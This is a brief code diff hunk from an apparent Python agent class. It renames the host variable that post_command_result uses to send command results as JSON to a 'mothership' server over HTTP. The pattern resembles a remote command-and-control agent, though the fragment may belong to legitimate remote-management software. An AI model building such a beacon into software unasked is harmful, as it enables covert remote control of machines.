@@ -108,7 +108,7 @@ class Agent:
     def post_command_result(self, result):
         # post
 
-        conn = http.client.HTTPConnection(mothership_server)
+        conn = http.client.HTTPConnection(MOTHERSHIP)
 
         headers = {'Content-type': 'application/json'}
 
